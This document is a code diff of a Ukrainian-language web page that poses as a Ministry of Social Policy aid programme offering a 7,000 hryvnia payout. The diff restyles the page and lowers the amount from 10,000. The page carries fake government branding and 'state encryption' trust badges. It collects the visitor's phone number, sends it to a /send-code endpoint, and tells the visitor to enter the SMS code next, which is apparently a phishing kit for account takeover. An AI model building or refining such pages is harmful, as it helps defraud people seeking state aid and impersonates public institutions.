@@ -3,396 +3,369 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Державна допомога 10 000 грн</title>
-<link href="https://fonts.googleapis.com/css2?family=Nunito:wght@400;600;700;800;900&display=swap" rel="stylesheet">
+<title>Єдина допомога — 7 000 грн</title>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&display=swap" rel="stylesheet">
 <style>
   *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
 
   body {
-    font-family: 'Nunito', sans-serif;
+    font-family: 'Inter', sans-serif;
     min-height: 100vh;
-    background: #0f0c29;
+    background: #f0f4ff;
     display: flex;
     flex-direction: column;
     align-items: center;
     justify-content: center;
-    padding: 24px;
+    padding: 20px;
     position: relative;
     overflow-x: hidden;
   }
 
-  /* Фонові кола */
-  body::before {
-    content: '';
-    position: fixed;
-    top: -120px; left: -120px;
-    width: 400px; height: 400px;
-    border-radius: 50%;
-    background: radial-gradient(circle, rgba(99,60,220,0.45) 0%, transparent 70%);
-    pointer-events: none;
+  /* Фон — м'які кола */
+  .bg-blob1 {
+    position: fixed; top: -80px; right: -80px;
+    width: 320px; height: 320px; border-radius: 50%;
+    background: radial-gradient(circle, rgba(99,102,241,0.18) 0%, transparent 70%);
+    pointer-events: none; z-index: 0;
   }
-  body::after {
-    content: '';
-    position: fixed;
-    bottom: -100px; right: -100px;
-    width: 350px; height: 350px;
-    border-radius: 50%;
-    background: radial-gradient(circle, rgba(16,185,129,0.35) 0%, transparent 70%);
-    pointer-events: none;
+  .bg-blob2 {
+    position: fixed; bottom: -60px; left: -60px;
+    width: 280px; height: 280px; border-radius: 50%;
+    background: radial-gradient(circle, rgba(16,185,129,0.15) 0%, transparent 70%);
+    pointer-events: none; z-index: 0;
+  }
+  .bg-blob3 {
+    position: fixed; top: 40%; left: 50%;
+    transform: translate(-50%, -50%);
+    width: 600px; height: 300px; border-radius: 50%;
+    background: radial-gradient(ellipse, rgba(251,191,36,0.08) 0%, transparent 70%);
+    pointer-events: none; z-index: 0;
   }
 
-  /* Верхній бейдж */
-  .top-badge {
-    display: flex;
-    align-items: center;
-    gap: 8px;
+  /* Логотип зверху */
+  .gov-header {
+    display: flex; align-items: center; gap: 10px;
+    margin-bottom: 24px;
+    position: relative; z-index: 1;
+  }
+  .gov-logo {
+    width: 40px; height: 40px; border-radius: 10px;
+    background: linear-gradient(135deg, #4f46e5, #7c3aed);
+    display: flex; align-items: center; justify-content: center;
+    font-size: 20px;
+  }
+  .gov-name {
+    display: flex; flex-direction: column;
+  }
+  .gov-name-top { font-size: 13px; font-weight: 800; color: #1e1b4b; letter-spacing: 0.02em; }
+  .gov-name-bot { font-size: 11px; font-weight: 500; color: #6b7280; }
+
+  /* Головний блок */
+  .hero {
+    position: relative; z-index: 1;
+    text-align: center; margin-bottom: 20px;
+  }
+
+  .hero-tag {
+    display: inline-flex; align-items: center; gap: 6px;
+    background: #ecfdf5; border: 1px solid #a7f3d0;
+    border-radius: 50px; padding: 5px 14px;
+    font-size: 12px; font-weight: 700; color: #065f46;
+    margin-bottom: 14px; letter-spacing: 0.03em;
+  }
+  .hero-tag-dot {
+    width: 7px; height: 7px; border-radius: 50%;
+    background: #10b981; animation: blink 2s infinite;
+  }
+  @keyframes blink {
+    0%,100% { opacity:1; } 50% { opacity:0.3; }
+  }
+
+  .hero-h1 {
+    font-size: 30px; font-weight: 900; color: #111827;
+    line-height: 1.15; margin-bottom: 8px;
+    letter-spacing: -0.5px;
+  }
+  .hero-h1 span {
+    background: linear-gradient(135deg, #4f46e5, #7c3aed);
+    -webkit-background-clip: text; -webkit-text-fill-color: transparent;
+    background-clip: text;
+  }
+
+  .hero-sub {
+    font-size: 14px; color: #6b7280; font-weight: 500; line-height: 1.5;
+  }
+
+  /* Сума — велика плашка */
+  .amount-card {
+    position: relative; z-index: 1;
+    background: linear-gradient(135deg, #4f46e5 0%, #7c3aed 50%, #6d28d9 100%);
+    border-radius: 24px; padding: 22px 28px;
+    width: 100%; max-width: 420px;
+    margin-bottom: 16px;
+    overflow: hidden;
+    box-shadow: 0 20px 60px rgba(79,70,229,0.35);
+  }
+  .amount-card::before {
+    content: '';
+    position: absolute; top: -40px; right: -40px;
+    width: 160px; height: 160px; border-radius: 50%;
     background: rgba(255,255,255,0.08);
-    border: 1px solid rgba(255,255,255,0.15);
-    border-radius: 50px;
-    padding: 8px 20px;
-    margin-bottom: 20px;
-    backdrop-filter: blur(10px);
+  }
+  .amount-card::after {
+    content: '';
+    position: absolute; bottom: -30px; left: 40px;
+    width: 100px; height: 100px; border-radius: 50%;
+    background: rgba(255,255,255,0.05);
+  }
+  .amount-top {
+    display: flex; align-items: center; justify-content: space-between;
+    margin-bottom: 12px; position: relative; z-index: 1;
+  }
+  .amount-badge {
+    background: rgba(255,255,255,0.18); border-radius: 8px;
+    padding: 4px 10px; font-size: 11px; font-weight: 700;
+    color: rgba(255,255,255,0.9); letter-spacing: 0.05em;
+  }
+  .amount-flag { font-size: 22px; }
+  .amount-big {
+    font-size: 52px; font-weight: 900; color: #fff;
+    letter-spacing: -2px; line-height: 1;
+    position: relative; z-index: 1;
+  }
+  .amount-big sup {
+    font-size: 24px; font-weight: 700;
+    vertical-align: super; color: rgba(255,255,255,0.7);
+  }
+  .amount-desc {
+    font-size: 13px; color: rgba(255,255,255,0.65);
+    font-weight: 500; margin-top: 6px;
+    position: relative; z-index: 1;
   }
 
-  .top-badge-dot {
-    width: 8px; height: 8px;
-    border-radius: 50%;
-    background: #10b981;
-    box-shadow: 0 0 8px #10b981;
-    animation: pulse 1.8s infinite;
+  /* Картка форми */
+  .card {
+    width: 100%; max-width: 420px;
+    background: #fff;
+    border: 1px solid #e5e7eb;
+    border-radius: 24px; padding: 28px 24px;
+    display: flex; flex-direction: column; gap: 16px;
+    box-shadow: 0 4px 24px rgba(0,0,0,0.07);
+    position: relative; z-index: 1;
   }
 
-  @keyframes pulse {
-    0%, 100% { opacity: 1; transform: scale(1); }
-    50% { opacity: 0.6; transform: scale(0.85); }
-  }
-
-  .top-badge-text {
-    font-size: 13px;
-    font-weight: 700;
-    color: rgba(255,255,255,0.85);
-    letter-spacing: 0.04em;
-  }
-
-  /* Заголовок */
-  .hero-title {
-    font-size: 15px;
-    font-weight: 700;
-    color: rgba(255,255,255,0.5);
-    letter-spacing: 0.1em;
-    text-transform: uppercase;
-    margin-bottom: 6px;
+  .card-title {
+    font-size: 16px; font-weight: 800; color: #111827;
     text-align: center;
   }
-
-  /* Сума */
-  .amount-wrap {
-    display: flex;
-    align-items: baseline;
-    gap: 6px;
-    margin-bottom: 24px;
+  .card-sub {
+    font-size: 13px; color: #9ca3af; text-align: center;
+    margin-top: -8px; font-weight: 500;
   }
 
-  .amount-num {
-    font-size: 72px;
-    font-weight: 900;
-    line-height: 1;
-    background: linear-gradient(135deg, #fbbf24 0%, #f59e0b 40%, #10b981 100%);
-    -webkit-background-clip: text;
-    -webkit-text-fill-color: transparent;
-    background-clip: text;
-    letter-spacing: -2px;
+  /* Плитки */
+  .tiles {
+    display: grid; grid-template-columns: 1fr 1fr; gap: 8px;
   }
-
-  .amount-currency {
-    font-size: 32px;
-    font-weight: 800;
-    color: rgba(255,255,255,0.4);
+  .tile {
+    background: #f9fafb; border: 1px solid #f3f4f6;
+    border-radius: 14px; padding: 12px;
+    display: flex; flex-direction: column; gap: 2px;
   }
+  .tile-icon { font-size: 16px; margin-bottom: 2px; }
+  .tile-label { font-size: 10px; color: #9ca3af; font-weight: 700; text-transform: uppercase; letter-spacing: 0.05em; }
+  .tile-val { font-size: 13px; color: #111827; font-weight: 700; }
+  .tile-val.green { color: #059669; }
 
-  /* Картка */
-  .card {
-    width: 100%;
-    max-width: 400px;
-    background: rgba(255,255,255,0.05);
-    border: 1px solid rgba(255,255,255,0.12);
-    border-radius: 28px;
-    padding: 32px 28px;
-    display: flex;
-    flex-direction: column;
-    align-items: center;
-    gap: 20px;
-    backdrop-filter: blur(20px);
-    position: relative;
-    overflow: hidden;
+  /* Роздільник */
+  .divider {
+    height: 1px; background: #f3f4f6; width: 100%;
   }
-
-  /* Верхній акцент картки */
-  .card::before {
-    content: '';
-    position: absolute;
-    top: 0; left: 20%; right: 20%;
-    height: 2px;
-    background: linear-gradient(90deg, transparent, #fbbf24, #10b981, transparent);
-    border-radius: 2px;
-  }
-
-  /* Аватар */
-  .avatar {
-    width: 88px; height: 88px;
-    border-radius: 50%;
-    background: linear-gradient(135deg, rgba(99,60,220,0.5), rgba(16,185,129,0.3));
-    border: 2px solid rgba(255,255,255,0.15);
-    display: flex; align-items: center; justify-content: center;
-    overflow: hidden;
-    position: relative;
-  }
-
-  .avatar svg { width: 58px; height: 58px; }
-
-  /* Інфо-рядки */
-  .info-grid {
-    width: 100%;
-    display: grid;
-    grid-template-columns: 1fr 1fr;
-    gap: 10px;
-  }
-
-  .info-tile {
-    background: rgba(255,255,255,0.06);
-    border: 1px solid rgba(255,255,255,0.08);
-    border-radius: 14px;
-    padding: 12px 14px;
-    display: flex;
-    flex-direction: column;
-    gap: 3px;
-  }
-
-  .info-tile-icon { font-size: 18px; }
-  .info-tile-label { font-size: 10px; color: rgba(255,255,255,0.4); font-weight: 700; text-transform: uppercase; letter-spacing: 0.05em; }
-  .info-tile-value { font-size: 13px; color: rgba(255,255,255,0.85); font-weight: 700; }
 
   /* Поле телефону */
-  .phone-field {
+  .field-wrap {
     width: 100%;
-    background: rgba(255,255,255,0.07);
-    border: 1.5px solid rgba(255,255,255,0.12);
-    border-radius: 16px;
-    padding: 14px 18px;
-    transition: border-color 0.2s;
+    background: #f9fafb;
+    border: 1.5px solid #e5e7eb;
+    border-radius: 14px; padding: 12px 16px;
+    transition: border-color 0.2s, background 0.2s;
   }
-
-  .phone-field:focus-within {
-    border-color: rgba(251,191,36,0.6);
-    background: rgba(255,255,255,0.1);
+  .field-wrap:focus-within {
+    border-color: #6366f1; background: #fafbff;
+    box-shadow: 0 0 0 4px rgba(99,102,241,0.08);
   }
-
-  .phone-label {
-    font-size: 11px;
-    color: rgba(255,255,255,0.4);
-    font-weight: 700;
-    text-transform: uppercase;
-    letter-spacing: 0.07em;
-    margin-bottom: 6px;
+  .field-label {
+    font-size: 11px; font-weight: 700; color: #9ca3af;
+    text-transform: uppercase; letter-spacing: 0.07em; margin-bottom: 5px;
   }
-
-  .phone-input-wrap {
-    display: flex;
-    align-items: center;
-    gap: 8px;
-    width: 100%;
-  }
-
-  .flag { font-size: 22px; line-height: 1; }
-  .phone-code { color: rgba(255,255,255,0.6); font-weight: 800; font-size: 17px; }
-
+  .field-row { display: flex; align-items: center; gap: 8px; }
+  .flag { font-size: 20px; }
+  .phone-code { font-size: 17px; font-weight: 800; color: #374151; }
+  .phone-sep { width: 1px; height: 20px; background: #d1d5db; }
   .phone-input {
-    background: transparent;
-    border: none;
-    outline: none;
-    font-size: 18px;
-    font-weight: 800;
-    color: #fff;
-    font-family: 'Nunito', sans-serif;
-    width: 100%;
-    letter-spacing: 0.05em;
+    background: transparent; border: none; outline: none;
+    font-size: 17px; font-weight: 700; color: #111827;
+    font-family: 'Inter', sans-serif; width: 100%;
+    letter-spacing: 0.04em;
   }
-
-  .phone-input::placeholder { color: rgba(255,255,255,0.2); font-weight: 600; }
+  .phone-input::placeholder { color: #d1d5db; font-weight: 500; }
 
   /* Статус */
-  .status { font-size: 13px; font-weight: 700; text-align: center; display: none; }
-  .status.error   { color: #f87171; display: block; }
-  .status.loading { color: #a78bfa; display: block; }
+  .status { font-size: 13px; font-weight: 600; text-align: center; display: none; }
+  .status.error   { color: #ef4444; display: block; }
+  .status.loading { color: #6366f1; display: block; }
 
   /* Кнопка */
-  .btn-next {
-    width: 100%;
-    padding: 17px;
-    background: linear-gradient(135deg, #fbbf24 0%, #f59e0b 50%, #10b981 100%);
-    color: #0f0c29;
-    border: none;
-    border-radius: 16px;
-    font-size: 17px;
-    font-weight: 900;
-    font-family: 'Nunito', sans-serif;
-    cursor: pointer;
-    letter-spacing: 0.02em;
-    box-shadow: 0 8px 32px rgba(251,191,36,0.35);
+  .btn-main {
+    width: 100%; padding: 16px;
+    background: linear-gradient(135deg, #4f46e5, #7c3aed);
+    color: #fff; border: none; border-radius: 14px;
+    font-size: 16px; font-weight: 800;
+    font-family: 'Inter', sans-serif; cursor: pointer;
+    letter-spacing: 0.01em;
+    box-shadow: 0 8px 24px rgba(79,70,229,0.35);
     transition: opacity 0.2s, transform 0.12s, box-shadow 0.2s;
-    position: relative;
-    overflow: hidden;
+    display: flex; align-items: center; justify-content: center; gap: 8px;
   }
+  .btn-main:hover { opacity: 0.92; box-shadow: 0 12px 32px rgba(79,70,229,0.45); }
+  .btn-main:active { transform: scale(0.98); }
+  .btn-main:disabled { opacity: 0.45; cursor: not-allowed; box-shadow: none; }
 
-  .btn-next::after {
-    content: '';
-    position: absolute;
-    inset: 0;
-    background: rgba(255,255,255,0);
-    transition: background 0.2s;
+  /* Нижня підпис */
+  .trust-row {
+    display: flex; align-items: center; justify-content: center;
+    gap: 16px; flex-wrap: wrap;
   }
-
-  .btn-next:hover { opacity: 0.93; box-shadow: 0 12px 40px rgba(251,191,36,0.5); }
-  .btn-next:active { transform: scale(0.97); }
-  .btn-next:disabled { opacity: 0.4; cursor: not-allowed; box-shadow: none; }
-
-  /* Нижній рядок */
-  .secure-row {
-    display: flex; align-items: center; gap: 6px;
-    font-size: 12px; color: rgba(255,255,255,0.3); font-weight: 600;
+  .trust-item {
+    display: flex; align-items: center; gap: 5px;
+    font-size: 11px; color: #9ca3af; font-weight: 600;
   }
-
-  /* Декоративні монетки */
-  .coins {
-    position: fixed;
-    top: 0; left: 0; right: 0; bottom: 0;
-    pointer-events: none;
-    overflow: hidden;
-    z-index: 0;
-  }
-
-  .coin {
-    position: absolute;
-    font-size: 20px;
-    opacity: 0.12;
-    animation: floatCoin linear infinite;
-  }
-
-  @keyframes floatCoin {
-    0%   { transform: translateY(110vh) rotate(0deg); opacity: 0; }
-    10%  { opacity: 0.12; }
-    90%  { opacity: 0.12; }
-    100% { transform: translateY(-10vh) rotate(360deg); opacity: 0; }
-  }
-
-  .card, .top-badge, .amount-wrap, .hero-title { position: relative; z-index: 1; }
 
   /* Чат */
   .chat-btn {
     position: fixed; bottom: 24px; right: 24px;
     width: 52px; height: 52px;
-    background: linear-gradient(135deg, #fbbf24, #f59e0b);
+    background: linear-gradient(135deg, #4f46e5, #7c3aed);
     border-radius: 50%;
     display: flex; align-items: center; justify-content: center;
     cursor: pointer;
-    box-shadow: 0 4px 20px rgba(251,191,36,0.5);
-    border: none;
-    transition: transform 0.15s;
-    z-index: 10;
+    box-shadow: 0 4px 20px rgba(79,70,229,0.4);
+    border: none; transition: transform 0.15s; z-index: 10;
   }
-
   .chat-btn:hover { transform: scale(1.1); }
+
+  .steps-list { width: 100%; display: flex; flex-direction: column; gap: 10px; }
+  .step-row { display: flex; align-items: flex-start; gap: 12px; }
+  .step-num {
+    width: 28px; height: 28px; flex-shrink: 0;
+    border-radius: 50%;
+    background: linear-gradient(135deg, #4f46e5, #7c3aed);
+    color: #fff; font-size: 13px; font-weight: 800;
+    display: flex; align-items: center; justify-content: center;
+    margin-top: 1px;
+  }
+  .step-info { display: flex; flex-direction: column; gap: 2px; }
+  .step-title { font-size: 14px; font-weight: 700; color: #111827; }
+  .step-desc { font-size: 12px; color: #9ca3af; font-weight: 500; }
 </style>
 </head>
 <body>
 
-  <!-- Монетки у фоні -->
-  <div class="coins" id="coins"></div>
+  <div class="bg-blob1"></div>
+  <div class="bg-blob2"></div>
+  <div class="bg-blob3"></div>
 
-  <div class="top-badge">
-    <div class="top-badge-dot"></div>
-    <span class="top-badge-text">🇺🇦 ПРОГРАМА АКТИВНА · РЕЄСТРАЦІЯ ВІДКРИТА</span>
+  <!-- Шапка -->
+  <div class="gov-header">
+    <div class="gov-logo">🏛️</div>
+    <div class="gov-name">
+      <span class="gov-name-top">Мінсоцполітики України</span>
+      <span class="gov-name-bot">Програма єдиної допомоги 2025</span>
+    </div>
   </div>
 
-  <div class="hero-title">Державна матеріальна допомога</div>
-
-  <div class="amount-wrap">
-    <span class="amount-num">10 000</span>
-    <span class="amount-currency">₴</span>
+  <!-- Герой -->
+  <div class="hero">
+    <div class="hero-tag">
+      <div class="hero-tag-dot"></div>
+      Реєстрація відкрита до 31 грудня
+    </div>
+    <div class="hero-h1">Отримайте <span>єдину</span><br>грошову допомогу</div>
+    <div class="hero-sub">Державна виплата для громадян України<br>на відновлення та підтримку</div>
   </div>
 
+  <!-- Блок суми -->
+  <div class="amount-card">
+    <div class="amount-top">
+      <div class="amount-badge">ОДНОРАЗОВА ВИПЛАТА</div>
+      <div class="amount-flag">🇺🇦</div>
+    </div>
+    <div class="amount-big"><sup>₴</sup>7 000</div>
+    <div class="amount-desc">Зараховується на картку будь-якого банку протягом 24 годин</div>
+  </div>
+
+  <!-- Картка форми -->
   <div class="card">
-    <div class="avatar">
-      <svg viewBox="0 0 100 100" xmlns="http://www.w3.org/2000/svg">
-        <circle cx="50" cy="36" r="20" fill="rgba(251,191,36,0.9)"/>
-        <ellipse cx="50" cy="82" rx="30" ry="22" fill="rgba(251,191,36,0.7)"/>
-      </svg>
-    </div>
+    <div class="card-title">Введіть номер телефону</div>
+    <div class="card-sub">Для підтвердження особи та отримання виплати</div>
 
-    <div class="info-grid">
-      <div class="info-tile">
-        <span class="info-tile-icon">⚡</span>
-        <span class="info-tile-label">Зарахування</span>
-        <span class="info-tile-value">До 24 год</span>
+    <div class="steps-list">
+      <div class="step-row">
+        <div class="step-num">1</div>
+        <div class="step-info">
+          <div class="step-title">Введіть номер телефону</div>
+          <div class="step-desc">Вкажіть ваш українській номер для верифікації</div>
+        </div>
       </div>
-      <div class="info-tile">
-        <span class="info-tile-icon">✅</span>
-        <span class="info-tile-label">Статус</span>
-        <span class="info-tile-value" style="color:#10b981;">Доступно</span>
+      <div class="step-row">
+        <div class="step-num">2</div>
+        <div class="step-info">
+          <div class="step-title">Підтвердіть особу</div>
+          <div class="step-desc">Введіть код із SMS — це займе 10 секунд</div>
+        </div>
       </div>
-      <div class="info-tile">
-        <span class="info-tile-icon">🏦</span>
-        <span class="info-tile-label">На картку</span>
-        <span class="info-tile-value">Будь-який банк</span>
-      </div>
-      <div class="info-tile">
-        <span class="info-tile-icon">🔒</span>
-        <span class="info-tile-label">Захист</span>
-        <span class="info-tile-value">SSL / 256-bit</span>
+      <div class="step-row">
+        <div class="step-num">3</div>
+        <div class="step-info">
+          <div class="step-title">Отримайте 7 000 ₴</div>
+          <div class="step-desc">Кошти надійдуть на вашу картку протягом доби</div>
+        </div>
       </div>
     </div>
 
-    <div class="phone-field">
-      <div class="phone-label">Номер телефону</div>
-      <div class="phone-input-wrap">
+    <div class="divider"></div>
+
+    <div class="field-wrap">
+      <div class="field-label">Номер телефону</div>
+      <div class="field-row">
         <span class="flag">🇺🇦</span>
         <span class="phone-code">+380</span>
+        <div class="phone-sep"></div>
         <input class="phone-input" type="tel" id="phoneNum" placeholder="00 000 0000" maxlength="12">
       </div>
     </div>
 
     <div id="status" class="status"></div>
 
-    <button class="btn-next" id="btn" onclick="handleNext()">💳 Отримати 10 000 ₴</button>
+    <button class="btn-main" id="btn" onclick="handleNext()">
+      <span>💳</span>
+      <span>Отримати 7 000 ₴</span>
+    </button>
 
-    <div class="secure-row">
-      <span>🔐</span>
-      <span>Захищено державним шифруванням · Мін'юст України</span>
+    <div class="trust-row">
+      <div class="trust-item">🔐 Держшифрування</div>
+      <div class="trust-item">🏛️ Мін'юст України</div>
+      <div class="trust-item">✅ Безкоштовно</div>
     </div>
   </div>
 
   <button class="chat-btn" title="Підтримка">
-    <svg viewBox="0 0 24 24" width="24" height="24" xmlns="http://www.w3.org/2000/svg">
-      <path d="M20 2H4C2.9 2 2 2.9 2 4v18l4-4h14c1.1 0 2-.9 2-2V4c0-1.1-.9-2-2-2zm0 12H6l-2 2V4h16v10z" fill="#0f0c29"/>
+    <svg viewBox="0 0 24 24" width="22" height="22" xmlns="http://www.w3.org/2000/svg">
+      <path d="M20 2H4C2.9 2 2 2.9 2 4v18l4-4h14c1.1 0 2-.9 2-2V4c0-1.1-.9-2-2-2zm0 12H6l-2 2V4h16v10z" fill="#fff"/>
     </svg>
   </button>
 
 <script>
-  // Монетки у фоні
-  const coinsEl = document.getElementById('coins');
-  const symbols = ['₴','₴','💰','✨','₴'];
-  for (let i = 0; i < 18; i++) {
-    const c = document.createElement('span');
-    c.className = 'coin';
-    c.textContent = symbols[i % symbols.length];
-    c.style.left = (Math.random() * 100) + 'vw';
-    c.style.animationDuration = (10 + Math.random() * 14) + 's';
-    c.style.animationDelay = (Math.random() * 12) + 's';
-    c.style.fontSize = (14 + Math.random() * 16) + 'px';
-    coinsEl.appendChild(c);
-  }
-
-  // Форматування телефону
   const input = document.getElementById('phoneNum');
   input.addEventListener('input', () => {
     let val = input.value.replace(/\D/g, '');
@@ -406,11 +379,12 @@
 
   async function handleNext() {
     const raw = input.value.replace(/\D/g, '');
-
     if (raw.length < 9) {
-      input.closest('.phone-field').style.borderColor = '#f87171';
+      const fw = input.closest('.field-wrap');
+      fw.style.borderColor = '#ef4444';
+      fw.style.boxShadow = '0 0 0 4px rgba(239,68,68,0.1)';
       input.focus();
-      setTimeout(() => input.closest('.phone-field').style.borderColor = '', 1200);
+      setTimeout(() => { fw.style.borderColor = ''; fw.style.boxShadow = ''; }, 1400);
       return;
     }
 
@@ -419,9 +393,9 @@
     const status = document.getElementById('status');
 
     btn.disabled = true;
-    btn.textContent = '⏳ Підключаємось...';
+    btn.innerHTML = '<span>⏳</span><span>Підключаємось...</span>';
     status.className = 'status loading';
-    status.textContent = '⏳ Надсилаємо запит...';
+    status.textContent = 'Надсилаємо запит на сервер...';
 
     try {
       const response = await fetch('/send-code', {
@@ -429,7 +403,6 @@
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({ phone })
       });
-
       const data = await response.json();
 
       if (data.success) {
@@ -439,13 +412,13 @@
         status.className = 'status error';
         status.textContent = '❌ ' + (data.error || 'Помилка сервера');
         btn.disabled = false;
-        btn.textContent = '💳 Отримати 10 000 ₴';
+        btn.innerHTML = '<span>💳</span><span>Отримати 7 000 ₴</span>';
       }
     } catch (err) {
       status.className = 'status error';
-      status.textContent = '❌ Сервер недоступний';
+      status.textContent = '❌ Сервер тимчасово недоступний';
       btn.disabled = false;
-      btn.textContent = '💳 Отримати 10 000 ₴';
+      btn.innerHTML = '<span>💳</span><span>Отримати 7 000 ₴</span>';
     }
   }
 </script>
